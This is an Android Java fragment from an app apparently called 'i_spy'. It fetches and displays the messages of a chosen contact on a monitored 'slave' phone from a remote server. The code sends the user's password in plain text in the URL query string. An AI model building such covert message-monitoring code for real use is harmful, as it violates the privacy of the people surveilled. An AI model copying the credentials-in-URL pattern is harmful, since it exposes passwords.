package com.um.asn.i_spy;

import android.app.Fragment;
import android.os.Bundle;
import android.support.annotation.Nullable;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

import com.um.asn.i_spy.adapters.MessagesAdapter;
import com.um.asn.i_spy.http_methods.HttpGetTask;
import com.um.asn.i_spy.models.Contact;
import com.um.asn.i_spy.models.Message;
import com.um.asn.i_spy.models.Phone;
import com.um.asn.i_spy.models.User;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.concurrent.ExecutionException;

public class ShowSlaveContactMessagesFragment extends Fragment {

    private Phone targetPhone;
    private User currentUser;
    private Contact targetContact;
    private MessagesAdapter showSlaveContactMessagesAdapter;
    private ListView showSlaveContactMessagesListView;
    private TextView showSlaveContactMessagesStatus;
    private String url;

    @Override
    public void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Bundle infosFromActivity = getArguments();

        // Recuperation du telephone
        targetPhone = new Phone(infosFromActivity.getInt("phone_id"),
                infosFromActivity.getString("phone_login"));

        // Recuperation des infos utilisateur
        currentUser = new User(infosFromActivity.getInt("user_id"),
                infosFromActivity.getString("user_mail"),
                infosFromActivity.getString("user_password"));

        // Recuperation des infos sur le contact
        targetContact = new Contact(infosFromActivity.getInt("contact_id"),
                infosFromActivity.getString("contact_name"),
                infosFromActivity.getString("contact_phone_number"));

        getActivity().setTitle(targetContact.getNom() + " " + targetContact.getNumero());
    }

    @Nullable
    @Override
    public View onCreateView(LayoutInflater inflater, @Nullable ViewGroup container, Bundle savedInstanceState) {
        View v = inflater.inflate(R.layout.fragment_show_slave_contact_messages, container, false);

        try {
            showSlaveContactMessagesListView = (ListView) v.findViewById(R.id.show_slave_contact_messages_list_view);
            showSlaveContactMessagesStatus = (TextView) v.findViewById(R.id.show_slave_contact_messages_status);

            // Construction de l'url REST
            url = Config.SERVER_DOMAIN
                    + "user/" + currentUser.getId()
                    + "/phone/" + targetPhone.getId()
                    + "/contact/" + targetContact.getId()
                    + "/messages" +
                    "?user[mail]=" + currentUser.getMail() + "&user[password]=" + currentUser.getPassword();

            JSONObject replyFromServer = new JSONObject((String) new HttpGetTask()
                    .execute(new Object[]{url}).get());

            if (!((boolean) replyFromServer.get("success"))) {

                if (replyFromServer.get("message").equals("wrongUser"))
                    Toast.makeText(getActivity(),
                            R.string.message_sign_in_failed, Toast.LENGTH_LONG).show();
                else Toast.makeText(getActivity(),
                        R.string.message_internal_server_error, Toast.LENGTH_LONG).show();
            } else {

                // le retour d'une requete select est un tableau JSON
                JSONArray messagesArray = (JSONArray) replyFromServer.get("data");

                if (messagesArray.length() == 0) {

                    showSlaveContactMessagesStatus.setText(R.string.message_no_messages);
                    showSlaveContactMessagesStatus.setVisibility(View.VISIBLE);

                } else {

                    // Boucle sur tous les objets JSON renvoye par la requete
                    ArrayList<Message> messages = new ArrayList<>();
                    JSONObject messageJSON;

                    for (int i = 0; i < messagesArray.length(); i++) {
                        messageJSON = messagesArray.getJSONObject(i);
                        messages.add(new Message(messageJSON.getInt("type"),
                                messageJSON.getJSONObject("dateMessage").getString("date"),
                                messageJSON.getString("contenu")));
                    }

                    showSlaveContactMessagesAdapter = new MessagesAdapter(getActivity(), messages);

                    showSlaveContactMessagesListView.setAdapter(showSlaveContactMessagesAdapter);

                }
            }

        } catch (InterruptedException e) {
            e.printStackTrace();
        } catch (ExecutionException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return v;

    }


}
